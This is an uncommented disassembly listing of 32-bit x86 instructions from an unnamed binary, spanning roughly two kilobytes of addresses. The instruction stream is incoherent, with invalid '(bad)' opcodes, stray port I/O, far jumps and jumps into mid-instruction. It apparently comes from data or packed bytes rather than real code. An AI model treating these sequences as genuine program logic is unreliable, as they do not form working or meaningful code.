  44e714:	movq   mm5,QWORD PTR [ebp-0x35]
  44e718:	sar    DWORD PTR [eax+0x2356aa90],cl
  44e71e:	sub    eax,0x3a35e125
  44e723:	je     0x44e743
  44e725:	jae    0x44e760
  44e727:	fimul  DWORD PTR [esi+0x46985b6f]
  44e72d:	int3   
  44e72e:	aad    0xbf
  44e730:	cmp    ah,BYTE PTR [ecx]
  44e732:	xor    eax,DWORD PTR [ebp+0x4a9aca62]
  44e738:	xor    dh,bh
  44e73a:	clc    
  44e73b:	add    DWORD PTR [edx],eax
  44e73d:	in     eax,dx
  44e73e:	push   0x20ab0a33
  44e743:	or     bh,dh
  44e745:	sub    DWORD PTR [esi+0x3c],esi
  44e748:	fwait
  44e749:	cld    
  44e74a:	sbb    bh,BYTE PTR [eax-0x4f]
  44e74d:	push   eax
  44e74e:	jl     0x44e763
  44e750:	out    0x50,al
  44e752:	xor    eax,0xe0dc4c28
  44e757:	jbe    0x44e718
  44e759:	push   edi
  44e75a:	and    BYTE PTR [eax],dh
  44e75c:	adc    BYTE PTR [esi+0x6306700a],dl
  44e762:	and    dh,BYTE PTR [eax+eax*1+0x79]
  44e766:	mov    ebp,0x6f3d9ed7
  44e76b:	retf   0xe33
  44e76e:	data16 or ah,BYTE PTR [edx+0x1f]
  44e772:	ins    DWORD PTR es:[edi],dx
  44e773:	fcomp  DWORD PTR [ecx]
  44e775:	sub    eax,0x361a5e68
  44e77a:	pop    eax
  44e77b:	ror    DWORD PTR [ecx],1
  44e77d:	add    BYTE PTR [edx],dl
  44e77f:	and    bl,BYTE PTR ds:0xde9a4383
  44e785:	push   ebp
  44e786:	ins    BYTE PTR es:[edi],dx
  44e787:	je     0x44e800
  44e789:	imul   edi,DWORD PTR [ebx],0xebdc78f4
  44e78f:	pop    eax
  44e790:	shl    BYTE PTR [edi-0x1c],0x53
  44e794:	inc    esi
  44e795:	jb     0x44e7f9
  44e797:	popf   
  44e798:	fwait
  44e799:	push   ecx
  44e79a:	adc    ah,BYTE PTR [edx+0x42]
  44e79d:	adc    esp,DWORD PTR [edi+ebp*8-0x4b]
  44e7a1:	jnp    0x44e752
  44e7a3:	push   cs
  44e7a4:	jb     0x44e7a8
  44e7a6:	outs   dx,DWORD PTR ds:[esi]
  44e7a7:	push   es
  44e7a8:	pop    ss
  44e7a9:	push   esi
  44e7aa:	cs push dx
  44e7ad:	add    ch,BYTE PTR gs:[ebx-0x26]
  44e7b1:	stc    
  44e7b2:	mov    ebp,0x2e6e367b
  44e7b7:	(bad)  [esi+0x70]
  44e7ba:	add    BYTE PTR [esi+ecx*1+0x65],ch
  44e7be:	jne    0x44e817
  44e7c0:	je     0x44e7d1
  44e7c2:	arpl   WORD PTR [ebp+0x76],sp
  44e7c5:	clc    
  44e7c6:	dec    edi
  44e7c7:	sub    bh,BYTE PTR [edi+0x61]
  44e7ca:	out    dx,eax
  44e7cb:	mov    ebp,0x6922ef6b
  44e7d0:	push   esi
  44e7d1:	outs   dx,BYTE PTR ds:[esi]
  44e7d2:	addr16 popa 
  44e7d4:	pop    esi
  44e7d5:	ins    BYTE PTR es:[edi],dx
  44e7d6:	push   ss
  44e7d7:	ja     0x44e830
  44e7d9:	cs mov eax,0x3b20b77d
  44e7df:	jae    0x44e7b4
  44e7e1:	je     0x44e80a
  44e7e3:	ins    BYTE PTR es:[edi],dx
  44e7e4:	lahf   
  44e7e5:	adc    cl,BYTE PTR [edx]
  44e7e7:	fidivr WORD PTR [ebx+0x16773b08]
  44e7ed:	imul   ecx,DWORD PTR [ebx+0x3f],0xc1ddae0d
  44e7f4:	inc    BYTE PTR [ebx+0x3e]
  44e7f7:	mov    dh,BYTE PTR [esi+0xa]
  44e7fa:	mov    bh,0x64
  44e7fc:	pop    es
  44e7fd:	xchg   edi,eax
  44e7fe:	fidivr DWORD PTR [ebx+0x2a]
  44e801:	gs adc esp,edi
  44e804:	cmp    ch,BYTE PTR [edi]
  44e806:	xchg   ebp,eax
  44e807:	push   0xffffff8e
  44e809:	xchg   DWORD PTR [edi+0x53],esi
  44e80c:	mov    es,WORD PTR [ecx]
  44e80e:	fiadd  DWORD PTR [ecx+0x61]
  44e811:	adc    al,0xc0
  44e813:	jmp    0x83dc:0x3d460e72
  44e81a:	idiv   bl
  44e81c:	push   cs
  44e81d:	push   ebx
  44e81e:	scas   eax,DWORD PTR es:[edi]
  44e81f:	push   es
  44e820:	push   cs
  44e821:	lahf   
  44e822:	sar    DWORD PTR [ebx],0xe4
  44e825:	out    0x1a,eax
  44e827:	jns    0x44e876
  44e829:	add    BYTE PTR [edi+0x7],ch
  44e82c:	data16 jne 0x44e836
  44e82f:	mov    ebx,0x1fd9e0f6
  44e834:	or     DWORD PTR [eax],eax
  44e836:	push   edi
  44e837:	mov    bl,0x6e
  44e839:	daa    
  44e83a:	or     BYTE PTR [edi+0x763b6db6],ch
  44e840:	jb     0x44e865
  44e842:	push   es
  44e843:	ret    
  44e844:	aas    
  44e845:	iret   
  44e846:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e847:	pusha  
  44e848:	shr    ebp,0x42
  44e84b:	and    ebx,DWORD PTR [edx]
  44e84d:	iret   
  44e84e:	stos   DWORD PTR es:[edi],eax
  44e84f:	cmp    al,0x78
  44e851:	ja     0x44e802
  44e853:	jb     0x44e8c8
  44e855:	pop    esi
  44e856:	and    bl,BYTE PTR [bp+si]
  44e859:	push   es
  44e85a:	and    eax,0xd61a74eb
  44e85f:	xor    ebp,ebp
  44e861:	pop    ds
  44e862:	and    eax,0xf7b3333b
  44e867:	mov    eax,ds:0xf770d685
  44e86c:	arpl   bx,si
  44e86e:	push   ebx
  44e86f:	sub    BYTE PTR [eax-0x61e8e0c4],bl
  44e875:	xor    BYTE PTR [edx+0x78],bl
  44e878:	and    eax,0x645b4570
  44e87d:	ja     0x44e8cd
  44e87f:	mov    bl,0x1b
  44e881:	fwait
  44e882:	(bad)  
  44e883:	lds    eax,FWORD PTR [ebp-0x65]
  44e886:	arpl   di,cx
  44e888:	mov    ebx,0x682e5666
  44e88d:	pop    es
  44e88e:	fild   QWORD PTR [ebx+edx*1+0x22]
  44e892:	mov    ecx,DWORD PTR [edx]
  44e894:	cs lahf 
  44e896:	sbb    DWORD PTR [edi],eax
  44e898:	in     eax,dx
  44e899:	mov    ebp,0x6ed76f6f
  44e89f:	addr16 push ss
  44e8a1:	jecxz  0x44e86a
  44e8a3:	pusha  
  44e8a4:	mov    DWORD PTR [eax],0xc3063f49
  44e8aa:	jo     0x44e837
  44e8ac:	mov    bh,0xea
  44e8ae:	call   0x3b90342a
  44e8b3:	imul   esi,DWORD PTR [eax-0x40],0x4a
  44e8b7:	mov    ch,0x1
  44e8b9:	sub    al,0xbb
  44e8bb:	mul    edx
  44e8bd:	cmp    eax,0x720a7507
  44e8c2:	push   edi
  44e8c3:	inc    esi
  44e8c4:	outs   dx,BYTE PTR ds:[esi]
  44e8c5:	bound  edx,QWORD PTR [esi]
  44e8c7:	and    edi,DWORD PTR [ebp+0x50c7b83]
  44e8cd:	push   ds
  44e8ce:	adc    ch,BYTE PTR [edx-0x2dbee998]
  44e8d4:	mov    al,0xd7
  44e8d6:	loopne 0x44e8b7
  44e8d8:	cmp    eax,DWORD PTR [ebx]
  44e8da:	das    
  44e8db:	ds out dx,eax
  44e8dd:	(bad)
  44e8e0:	out    dx,al
  44e8e1:	jnp    0x44e948
  44e8e3:	adc    ebp,DWORD PTR [edi+edi*8+0x41]
  44e8e7:	adc    ah,BYTE PTR [edi+0x69]
  44e8ea:	jp     0x44e8d6
  44e8ec:	jo     0x44e8f4
  44e8ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e8ef:	or     edi,ebx
  44e8f1:	mov    edx,0x76b8b374
  44e8f6:	jo     0x44e95a
  44e8f8:	push   ebx
  44e8f9:	out    dx,al
  44e8fa:	dec    edi
  44e8fb:	mov    ds:0xb4211fbf,al
  44e900:	neg    dh
  44e902:	out    dx,al
  44e903:	dec    esi
  44e904:	push   ss
  44e905:	jbe    0x44e94a
  44e907:	mov    eax,0x3dae8b75
  44e90c:	push   cs
  44e90d:	arpl   WORD PTR [ebx],sp
  44e90f:	add    ecx,DWORD PTR [edi-0xd]
  44e912:	outs   dx,DWORD PTR ds:[esi]
  44e913:	test   al,0x2d
  44e915:	call   0x127:0x3370fe8
  44e91c:	into   
  44e91d:	jmp    0x2a534a02
  44e922:	bound  esp,QWORD PTR [ebx]
  44e924:	outs   dx,DWORD PTR ds:[esi]
  44e925:	cli    
  44e926:	call   0xf6e32ce8
  44e92b:	inc    ebp
  44e92c:	aas    
  44e92d:	cmp    ah,BYTE PTR [ebx-0x21]
  44e930:	sub    edx,0xffffffd5
  44e933:	rcl    DWORD PTR [edi],0x8a
  44e936:	fild   QWORD PTR [ebx+esi*8+0x17]
  44e93a:	fcmovnbe st,st(3)
  44e93c:	ja     0x44e954
  44e93e:	or     esp,DWORD PTR [edi+esi*8+0x53]
  44e942:	cs jo  0x44e8cf
  44e945:	(bad)  
  44e946:	jne    0x44e9a7
  44e948:	add    DWORD PTR [ebx+0x6d],0x52
  44e94c:	inc    esi
  44e94d:	jnp    0x44e96c
  44e94f:	pusha  
  44e950:	enter  0x27e5,0x27
  44e954:	xor    DWORD PTR [eax],0xfffffff9
  44e957:	loope  0x44e8db
  44e959:	sbb    DWORD PTR [edx+ecx*2],0x79
  44e95d:	add    BYTE PTR [ebx-0x50],dh
  44e960:	xchg   esi,eax
  44e961:	not    BYTE PTR [esi+0x33]
  44e964:	jnp    0x44e918
  44e966:	inc    ebx
  44e967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e968:	add    ah,bl
  44e96a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e96b:	mov    dh,0x5f
  44e96d:	fs sub bh,dl
  44e970:	jge    0x44e99a
  44e972:	or     BYTE PTR ds:0x5ceb86ab,bh
  44e978:	xor    DWORD PTR ds:0x1f6b4f1d,0x4f
  44e97f:	stos   BYTE PTR es:[edi],al
  44e980:	fcom   QWORD PTR ds:0x6f9e787c
  44e986:	arpl   WORD PTR [ebx-0x4753c19a],dx
  44e98c:	jecxz  0x44ea0b
  44e98e:	(bad)  
  44e98f:	xchg   edx,eax
  44e990:	add    eax,DWORD PTR [edi]
  44e992:	add    esi,edi
  44e994:	push   ecx
  44e995:	pop    esp
  44e996:	cmp    al,0x5c
  44e998:	mov    bl,0xdf
  44e99a:	fcmovnbe st,st(3)
  44e99c:	push   edi
  44e99d:	cmp    al,0xb2
  44e99f:	leave  
  44e9a0:	add    ecx,DWORD PTR [edi]
  44e9a2:	add    cl,bl
  44e9a4:	add    ebx,DWORD PTR [ecx+esi*2-0x3b]
  44e9a8:	adc    eax,0x3a703bf
  44e9ad:	xchg   edi,eax
  44e9ae:	add    ebp,DWORD PTR [edi-0x7ca92be0]
  44e9b4:	add    DWORD PTR [esi+0x56],edi
  44e9b7:	fucomip st,st(7)
  44e9b9:	je     0x44e97b
  44e9bb:	sub    DWORD PTR [ecx+0xb],0x74
  44e9bf:	xchg   ebx,eax
  44e9c0:	jb     0x44e9e0
  44e9c2:	data16 aad 0x72
  44e9c5:	je     0x44e9d6
  44e9c7:	(bad)  
  44e9c8:	cmp    bh,BYTE PTR [edx+0xf4d4e61]
  44e9ce:	fisubr WORD PTR [ebx+0x6bb26f5f]
  44e9d4:	jg     0x44e9f5
  44e9d6:	daa    
  44e9d7:	sahf   
  44e9d8:	dec    esi
  44e9d9:	mov    ebx,DWORD PTR ds:0x432e9f76
  44e9df:	sbb    edi,DWORD PTR [esi-0x24]
  44e9e2:	adc    DWORD PTR [ebx],esp
  44e9e4:	push   esi
  44e9e5:	lahf   
  44e9e6:	jae    0x44ea03
  44e9e8:	xchg   BYTE PTR [esi],cl
  44e9ea:	sbb    al,0xb5
  44e9ec:	sbb    DWORD PTR [edi+0x6f],edi
  44e9ef:	or     esp,DWORD PTR ds:0xc5584700
  44e9f5:	addr16 push edi
  44e9f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44e9f8:	cmp    al,al
  44e9fa:	lds    ecx,FWORD PTR [esi+0x7f0b3876]
  44ea00:	xor    eax,0x2e1d5d60
  44ea05:	mov    bh,0xa3
  44ea07:	fs jmp 0x44ea1a
  44ea0a:	sbb    al,0xb0
  44ea0c:	adc    DWORD PTR [ebx+0x74],0xedb366bf
  44ea13:	arpl   cx,dx
  44ea15:	ins    BYTE PTR es:[edi],dx
  44ea16:	mov    bh,0x29
  44ea18:	adc    eax,DWORD PTR [edi]
  44ea1a:	cmp    esi,DWORD PTR [eax+0x13]
  44ea1d:	dec    eax
  44ea1e:	pop    eax
  44ea1f:	cmp    ah,BYTE PTR [edi-0x2973c49a]
  44ea25:	or     BYTE PTR [edi+0x7b01173e],ah
  44ea2b:	inc    eax
  44ea2c:	push   0x89f73beb
  44ea31:	pusha  
  44ea32:	push   ebp
  44ea33:	or     al,0x10
  44ea35:	iret   
  44ea36:	pop    ss
  44ea37:	ret    0x8dd7
  44ea3a:	xchg   BYTE PTR [eax],dl
  44ea3c:	stos   DWORD PTR es:[edi],eax
  44ea3d:	pop    esi
  44ea3e:	pop    DWORD PTR [ebp+0x2bae2823]
  44ea44:	adc    al,0xd7
  44ea46:	pop    ss
  44ea47:	or     ch,BYTE PTR ds:0x73775030
  44ea4d:	(bad)  
  44ea4e:	jo     0x44ea53
  44ea50:	or     BYTE PTR [esp+eiz*4],ah
  44ea53:	push   edi
  44ea54:	push   edx
  44ea55:	mov    edx,DWORD PTR ds:0x78df7b56
  44ea5b:	imul   esp,DWORD PTR [ebx+0x2b],0xffffffbf
  44ea5f:	pop    ebx
  44ea60:	shl    edi,0xd4
  44ea63:	dec    edx
  44ea64:	xchg   BYTE PTR [edx+0x74],bl
  44ea67:	and    ebp,DWORD PTR [esi+0x23]
  44ea6a:	xor    DWORD PTR [ebp+0x783bdd5f],0xa8e77087
  44ea74:	out    dx,al
  44ea75:	stos   BYTE PTR es:[edi],al
  44ea76:	loopne 0x44ea5a
  44ea78:	mov    dl,0x41
  44ea7a:	xlat   BYTE PTR ds:[ebx]
  44ea7b:	push   esi
  44ea7c:	or     edi,DWORD PTR [eax+0x172e0ef7]
  44ea82:	mov    bl,0x9b
  44ea84:	das    
  44ea85:	mov    ah,BYTE PTR [ecx]
  44ea87:	mov    ch,0x3b
  44ea89:	sub    BYTE PTR [edi+0x1c],bl
  44ea8c:	cli    
  44ea8d:	xlat   BYTE PTR ds:[ebx]
  44ea8e:	push   cs
  44ea8f:	jmp    0x7443bdee
  44ea94:	daa    
  44ea95:	jle    0x44ea38
  44ea97:	mov    eax,0x684af5f8
  44ea9c:	xchg   DWORD PTR [eax],edx
  44ea9e:	pop    ds
  44ea9f:	das    
  44eaa0:	jnp    0x44ea66
  44eaa2:	mov    ebx,0x6e9b2ca7
  44eaa7:	fist   WORD PTR [edi-0x595be5ff]
  44eaad:	push   esp
  44eaae:	addr16 aaa 
  44eab0:	imul   edx,DWORD PTR [ecx],0x8308d156
  44eab6:	push   DWORD PTR [edi+0x2b]
  44eab9:	scas   al,BYTE PTR es:[edi]
  44eaba:	jo     0x44eb0f
  44eabc:	arpl   WORD PTR [edx],dx
  44eabe:	imul   DWORD PTR [edi+0x2a]
  44eac1:	lock add BYTE PTR ds:0x1f300a67,0xed
  44eac9:	stos   BYTE PTR es:[edi],al
  44eaca:	add    DWORD PTR [ecx-0x173cef1d],eax
  44ead0:	lds    ecx,FWORD PTR [ebx]
  44ead2:	inc    edi
  44ead3:	push   cs
  44ead4:	dec    edx
  44ead5:	pop    ss
  44ead6:	imul   ebx,DWORD PTR [edi-0x7d],0xffffffab
  44eada:	stos   DWORD PTR es:[edi],eax
  44eadb:	pop    ebx
  44eadc:	or     eax,0x6f72e36f
  44eae1:	sub    eax,0x7a7c1c7e
  44eae6:	push   ds
  44eae7:	and    BYTE PTR [edi+0x6b50d674],dl
  44eaed:	jbe    0x44ea71
  44eaef:	ret    
  44eaf0:	mov    gs,WORD PTR [ebx]
  44eaf2:	mov    edi,0xaa439b67
  44eaf7:	cwde   
  44eaf8:	or     bh,BYTE PTR [ebx+eax*1]
  44eafb:	jne    0x44eb1c
  44eafd:	sub    BYTE PTR [edi-0x3f06fda2],dl
  44eb03:	scas   al,BYTE PTR es:[edi]
  44eb04:	jae    0x44eb39
  44eb06:	cs leave 
  44eb08:	pop    es
  44eb09:	push   cs
  44eb0a:	dec    edi
  44eb0b:	push   ss
  44eb0c:	jo     0x44eb14
  44eb0e:	pop    ebx
  44eb0f:	and    DWORD PTR [esi],edx
  44eb11:	clc    
  44eb12:	pop    ss
  44eb13:	adc    DWORD PTR [esi+0x53],esi
  44eb16:	stos   DWORD PTR es:[edi],eax
  44eb17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44eb18:	shl    BYTE PTR [ebp+0x60],0xaf
  44eb1c:	xor    esi,ebx
  44eb1e:	unpcklps xmm6,XMMWORD PTR [edi-0x6c92a4f8]
  44eb25:	pop    ebx
  44eb26:	out    0x4f,al
  44eb28:	addr16 mov esp,0x2b4a5bb6
  44eb2e:	ds push edx
  44eb30:	(bad)  
  44eb31:	sbb    BYTE PTR [ebx],cl
  44eb33:	outs   dx,BYTE PTR ds:[esi]
  44eb34:	mov    ds:0xba061f62,eax
  44eb39:	mov    ch,0x7
  44eb3b:	scas   al,BYTE PTR es:[edi]
  44eb3c:	stos   BYTE PTR es:[edi],al
  44eb3d:	pop    edi
  44eb3e:	sbb    edx,DWORD PTR [esi]
  44eb40:	das    
  44eb41:	add    eax,DWORD PTR [edx-0x54099725]
  44eb47:	popw   es
  44eb49:	test   BYTE PTR ds:0x5722ae8d,dl
  44eb4f:	adc    DWORD PTR [esi-0x24acb2fa],0x73
  44eb56:	inc    edi
  44eb57:	mov    eax,0x80543730
  44eb5c:	or     eax,DWORD PTR ds:0xe1ac4a46
  44eb62:	data16 jecxz 0x44eb89
  44eb65:	pop    es
  44eb66:	pop    ebx
  44eb67:	mov    dh,BYTE PTR [eax+0x1bdbb00a]
  44eb6d:	sub    BYTE PTR [ecx],dl
  44eb6f:	adc    DWORD PTR [esi],esp
  44eb71:	sub    DWORD PTR [ebx-0x76],esi
  44eb74:	push   esp
  44eb75:	pop    ebx
  44eb76:	adc    eax,0x89be01a3
  44eb7b:	pop    DWORD PTR [edi+0x337b4fb5]
  44eb81:	aas    
  44eb82:	lods   eax,DWORD PTR ds:[esi]
  44eb83:	add    bh,dh
  44eb85:	je     0x44ebe1
  44eb87:	or     al,0xc6
  44eb89:	das    
  44eb8a:	ds dec edi
  44eb8c:	sbb    cl,BYTE PTR [esi+0xeab5716]
  44eb92:	ficom  DWORD PTR [edi]
  44eb94:	arpl   WORD PTR [ebx+0x34],sp
  44eb97:	pusha  
  44eb98:	in     al,dx
  44eb99:	out    dx,ax
  44eb9b:	repz inc ecx
  44eb9d:	mov    esp,0xb2071601
  44eba2:	ret    
  44eba3:	push   0x88b73cb0
  44eba8:	fisubr WORD PTR [edi-0x25]
  44ebab:	jns    0x44ec0a
  44ebad:	cmp    ebx,DWORD PTR [eax-0x3b]
  44ebb0:	arpl   WORD PTR [esi+0x12],di
  44ebb3:	iret   
  44ebb4:	popa   
  44ebb5:	in     al,0xc5
  44ebb7:	ja     0x44ebe9
  44ebb9:	mov    edi,0x33695764
  44ebbe:	pop    ss
  44ebbf:	and    BYTE PTR [edi],dh
  44ebc1:	sahf   
  44ebc2:	ss bound edi,QWORD PTR cs:[ecx-0x19]
  44ebc7:	or     edx,edi
  44ebc9:	push   es
  44ebca:	fld    TBYTE PTR [esi+0xf]
  44ebcd:	mov    dh,0xaf
  44ebcf:	or     DWORD PTR [edi],edx
  44ebd1:	xchg   DWORD PTR [eax+0x6bf29682],edi
  44ebd7:	fwait
  44ebd8:	not    DWORD PTR [esi]
  44ebda:	cmp    ecx,DWORD PTR [esi+0x6e671582]
  44ebe0:	ret    
  44ebe1:	and    ebp,DWORD PTR [ebx+0x6386e1f7]
  44ebe7:	jecxz  0x44ec59
  44ebe9:	push   edi
  44ebea:	adc    BYTE PTR [edi+0x1b],bh
  44ebed:	fiadd  WORD PTR [ebx-0x1114faa5]
  44ebf3:	xchg   DWORD PTR [edx+0x5f],edi
  44ebf6:	jle    0x44eba4
  44ebf8:	xchg   esi,eax
  44ebf9:	or     ebp,DWORD PTR [esi+0x52520011]
  44ebff:	sub    ebp,DWORD PTR [eax+0x2]
  44ec02:	xlat   BYTE PTR ds:[ebx]
  44ec03:	jo     0x44ec7a
  44ec05:	out    dx,eax
  44ec06:	xchg   ebx,eax
  44ec07:	adc    BYTE PTR ds:0x47b7d757,cl
  44ec0d:	dec    ebx
  44ec0e:	jb     0x44ec37
  44ec10:	and    BYTE PTR [edi+0x5b87580f],cl
  44ec16:	xor    edi,DWORD PTR [edi-0x77bfbfad]
  44ec1c:	or     ecx,DWORD PTR [ebx+0x2e]
  44ec1f:	or     cl,BYTE PTR [esi]
  44ec21:	call   0xb417:0x8f646370
  44ec28:	mov    eax,ds:0x637fd160
  44ec2d:	sbb    BYTE PTR [edi-0x2c],bl
  44ec30:	push   es
  44ec31:	sti    
  44ec32:	pop    eax
  44ec33:	aas    
  44ec34:	arpl   WORD PTR [ecx],ax
  44ec36:	sub    ch,bh
  44ec38:	(bad)  
  44ec39:	aas    
  44ec3a:	mov    ds:0x7b98df8c,al
  44ec3f:	cmp    al,0x3a
  44ec41:	jns    0x44ec69
  44ec43:	jno    0x44ec84
  44ec45:	or     DWORD PTR [edi],ecx
  44ec47:	sub    ah,BYTE PTR ds:0x10cc2e17
  44ec4d:	test   DWORD PTR [eax],esp
  44ec4f:	mov    ch,0xff
  44ec51:	push   es
  44ec52:	add    DWORD PTR [edi],ebp
  44ec54:	imul   esp,DWORD PTR [ebp+0x53],0x71
  44ec58:	adc    al,0xc7
  44ec5a:	xchg   DWORD PTR [edi-0x2d],edx
  44ec5d:	aam    0x91
  44ec5f:	fcmovb st,st(7)
  44ec61:	xchg   ebx,eax
  44ec62:	sbb    DWORD PTR [ecx-0x70],0x49107e2e
  44ec69:	outs   dx,BYTE PTR ds:[esi]
  44ec6a:	imul   edx,DWORD PTR [esi+ebx*2+0x37],0xe1bd4933
  44ec72:	adc    BYTE PTR [edx],ah
  44ec74:	pushf  
  44ec75:	push   ecx
  44ec76:	adc    BYTE PTR [eax+0x49],ch
  44ec79:	in     eax,dx
  44ec7a:	popf   
  44ec7b:	popf   
  44ec7c:	pop    ss
  44ec7d:	adc    al,0x55
  44ec7f:	xchg   DWORD PTR [ecx],ecx
  44ec81:	jne    0x44ec6d
  44ec83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44ec84:	add    al,0x4b
  44ec86:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  44ec88:	or     BYTE PTR [ebp+0x331c12db],dh
  44ec8e:	dec    ebp
  44ec8f:	push   ds
  44ec90:	jae    0x44ed00
  44ec92:	ins    DWORD PTR es:[edi],dx
  44ec93:	mov    bl,0x41
  44ec95:	cmp    eax,0x4e5102a0
  44ec9a:	inc    ebx
  44ec9b:	dec    esi
  44ec9c:	pop    ebx
  44ec9d:	push   0x2414f748
  44eca2:	or     DWORD PTR ds:0x512bdddb,esi
  44eca8:	jp     0x44ec7a
  44ecaa:	outs   dx,WORD PTR ds:[esi]
  44ecac:	jae    0x44ed13
  44ecae:	inc    edx
  44ecaf:	in     eax,dx
  44ecb0:	xchg   edi,eax
  44ecb1:	lahf   
  44ecb2:	pop    eax
  44ecb3:	push   0x29b9082b
  44ecb8:	retf   0xf43a
  44ecbb:	mov    edx,0xb889a088
  44ecc0:	add    esp,ebp
  44ecc2:	fiadd  WORD PTR [esp+eiz*2+0x61d8aebe]
  44ecc9:	add    DWORD PTR ds:0x48416f37,esp
  44eccf:	xchg   esi,eax
  44ecd0:	adc    al,0x61
  44ecd2:	inc    esi
  44ecd3:	outs   dx,DWORD PTR ds:[esi]
  44ecd4:	jb     0x44ed0c
  44ecd6:	cmc    
  44ecd7:	add    al,0x49
  44ecd9:	jne    0x44ed49
  44ecdb:	jmp    FWORD PTR [edi+0x47]
  44ecde:	xchg   ecx,eax
  44ecdf:	sub    BYTE PTR [esi+0x69],dl
  44ece2:	jb     0x44ed58
  44ece4:	jne    0x44ed47
  44ece6:	ins    BYTE PTR es:[edi],dx
  44ece7:	push   ecx
  44ece8:	jne    0x44ed4f
  44ecea:	jb     0x44ed65
  44ecec:	sbb    dl,BYTE PTR [ebx+0x65]
  44ecef:	je     0x44ecaf
  44ecf1:	int3   
  44ecf2:	adc    ch,ah
  44ecf4:	push   edi
  44ecf5:	rcr    DWORD PTR [edi],1
  44ecf7:	inc    ebp
  44ecf8:	mov    bl,0x55
  44ecfa:	cdq    
  44ecfb:	test   eax,0xa8131610
  44ed00:	dec    edi
  44ed01:	xchg   bp,ax
  44ed03:	push   edx
  44ed04:	rcl    BYTE PTR [eax+0x33a254c6],0xd5
  44ed0b:	or     BYTE PTR [edx-0x27],cl
  44ed0e:	cwde   
  44ed0f:	sub    ecx,edx
  44ed11:	inc    esp
  44ed12:	push   ebx
  44ed13:	pop    ebp
  44ed14:	xor    ecx,DWORD PTR [ebp+0x6e]
  44ed17:	and    cl,BYTE PTR [esp+esi*1+0x43]
  44ed1b:	lock jo 0x44ecd0
  44ed1e:	mov    ebp,0x7032b5cc
  44ed23:	cwde   
  44ed24:	sub    cl,BYTE PTR ds:[ecx-0x564a5197]
  44ed2b:	ins    DWORD PTR es:[edi],dx
  44ed2c:	push   ds
  44ed2d:	imul   edi,DWORD PTR [edx+0x35],0xdc569847
  44ed34:	jae    0x44ed4c
  44ed36:	mov    ds:0x569493dc,al
  44ed3b:	sbb    eax,0x8a6f480
  44ed40:	jecxz  0x44eda7
  44ed42:	and    ecx,ebp
  44ed44:	ins    DWORD PTR es:[edi],dx
  44ed45:	pop    esi
  44ed46:	xchg   DWORD PTR [ecx-0x3f],esp
  44ed49:	inc    ebp
  44ed4a:	and    ah,BYTE PTR [edx+edx*4-0x3]
  44ed4e:	sahf   
  44ed4f:	or     BYTE PTR [edi],dh
  44ed51:	sbb    edx,DWORD PTR [eax+0x72]
  44ed54:	push   esi
  44ed55:	sar    BYTE PTR [ebx+0x55],cl
  44ed58:	sub    dl,0x72
  44ed5b:	ficomp WORD PTR [edi]
  44ed5d:	mov    ch,0x99
  44ed5f:	push   ebp
  44ed60:	xor    BYTE PTR [edx+0x41413475],0x23
  44ed67:	jnp    0x44ed1f
  44ed69:	sub    BYTE PTR [ebx-0x26d86cad],al
  44ed6f:	imul   ebx,DWORD PTR [esi-0x67],0xffffffc1
  44ed73:	jmp    0x44ed94
  44ed75:	push   esp
  44ed76:	imul   edi,DWORD PTR [esi+edi*4],0x1b94a04d
  44ed7d:	lahf   
  44ed7e:	sbb    eax,DWORD PTR [esi+0x74]
  44ed81:	aam    0x16
  44ed83:	aad    0x7a
  44ed85:	ins    BYTE PTR es:[edi],dx
  44ed86:	(bad)  
  44ed88:	ins    BYTE PTR es:[edi],dx
  44ed89:	pop    ebx
  44ed8a:	les    esp,FWORD PTR [ebx+ecx*8+0x52424025]
  44ed91:	data16 int 0xc4
  44ed94:	pusha  
  44ed95:	ins    DWORD PTR es:[edi],dx
  44ed96:	or     al,0x1f
  44ed98:	jae    0x44ed4d
  44ed9a:	pop    ss
  44ed9b:	sbb    al,0xf
  44ed9d:	popf   
  44ed9e:	dec    ecx
  44ed9f:	fs daa 
  44eda1:	push   eax
  44eda2:	loope  0x44edb9
  44eda4:	retf   
  44eda5:	or     ah,0xec
  44eda8:	inc    ecx
  44eda9:	push   ss
  44edaa:	push   cs
  44edab:	pop    edi
  44edac:	push   ebx
  44edad:	ins    BYTE PTR es:[edi],dx
  44edae:	outs   dx,BYTE PTR ds:[esi]
  44edaf:	shl    eax,0x86
  44edb2:	into   
  44edb3:	jne    0x44ee22
  44edb5:	inc    ebx
  44edb6:	sub    al,0x74
  44edb8:	popa   
  44edb9:	jb     0x44ee0e
  44edbb:	test   al,0xd1
  44edbd:	mov    al,0x78
  44edbf:	and    eax,0xd4d6d1c
  44edc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44edc5:	mov    ah,0x2e
  44edc7:	test   BYTE PTR [ebx+0x36117743],bl
  44edcd:	(bad)
  44edd0:	inc    ecx
  44edd1:	sbb    DWORD PTR [ebp+0x1b],edx
  44edd4:	out    dx,al
  44edd5:	xor    bl,BYTE PTR [eax+0x566d6f60]
  44eddb:	and    bl,BYTE PTR [ecx+0x736f6c1f]
  44ede1:	loop   0x44edad
  44ede3:	sbb    al,0x1b
  44ede5:	dec    ecx
  44ede6:	les    edx,FWORD PTR [si+0x6c]
  44edea:	jae    0x44edbe
  44edec:	cmp    eax,0x4fdcd49a
  44edf1:	sbb    DWORD PTR [edi+0x6],eax
  44edf4:	xor    edi,DWORD PTR [eax+ebx*1+0x3f]
  44edf8:	inc    ecx
  44edf9:	push   cs
  44edfa:	or     al,0xc9
  44edfc:	mov    bl,0xed
  44edfe:	stc    
  44edff:	lods   eax,DWORD PTR ds:[esi]
  44ee00:	and    eax,0x651c5362
  44ee06:	jo     0x44eda9
  44ee08:	add    al,0xc1
  44ee0a:	adc    DWORD PTR [edx],esp
  44ee0c:	cmp    BYTE PTR [ecx+0x4f],dl
  44ee0f:	adc    al,0x88
  44ee11:	jecxz  0x44ee33
  44ee13:	xlat   BYTE PTR ds:[ebx]
  44ee14:	jnp    0x44edc6
  44ee16:	pusha  
  44ee17:	mov    bl,0x58
  44ee19:	test   DWORD PTR [ebx],edx
